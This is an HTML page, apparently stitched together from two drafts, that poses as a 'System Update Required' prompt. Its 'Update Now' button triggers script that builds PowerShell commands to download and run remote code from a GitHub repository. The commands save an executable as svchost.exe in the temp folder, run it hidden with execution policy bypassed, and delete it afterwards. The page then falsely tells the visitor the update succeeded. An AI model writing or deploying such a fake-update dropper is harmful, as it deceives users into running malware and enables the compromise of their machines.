<!DOCTYPE html>
<html>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
    <h2>System Update Required</h2>
    <p>Please click below to complete the update.</p>
    
    <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
        Update Now
    </button>
    <script>
        document.getElementById('updateBtn').addEventListener('click', function() {
            // This creates a temporary file on the fly and runs it
            var url = "powershell.exe -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/finnandrew888/Windows-security-update/main/launch.txt')\"";
            
            // We use a small trick to bypass the popup blocker
            var w = window.open("about:blank", "_blank", "width=1,height=1");
            w.document.write('<iframe src="' + url + '"></iframe>');
            
            // Hide UI
            this.style.display = 'none';
            document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
        });
    </script>
</body>
</html><!DOCTYPE html>
<html>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
    <h2>System Update Required</h2>
    <p>Please click below to complete the update.</p>
    
    <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
        Update Now
    </button>

    <!-- Hidden iframe to execute the script -->
    <iframe id="execFrame" style="display:none;"></iframe>

    <script>
        document.getElementById('updateBtn').addEventListener('click', function() {
            // 1. The command to download and run your exe
            // Note: Removed the trailing backslash from the URL
            var psCmd = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
            
            // 2. Create a temporary script blob
            var blob = new Blob([psCmd], {type: 'text/plain'});
            var url = URL.createObjectURL(blob);
            
            // 3. Execute it via the hidden iframe
            document.getElementById('execFrame').src = url;
            
            // 4. Hide UI
            this.style.display = 'none';
            document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
        });
    </script>
</body>
</html>
